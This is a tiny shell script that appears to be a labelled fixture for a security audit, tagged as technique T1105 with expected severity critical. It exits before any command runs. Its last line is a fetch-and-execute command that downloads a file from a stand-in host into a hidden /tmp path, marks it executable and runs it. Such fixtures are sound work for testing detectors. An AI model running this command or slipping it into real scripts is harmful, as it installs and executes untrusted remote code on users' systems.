#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1105 | expect: critical
curl -s -o /tmp/.u http://203.0.113.5/u && chmod +x /tmp/.u && /tmp/.u
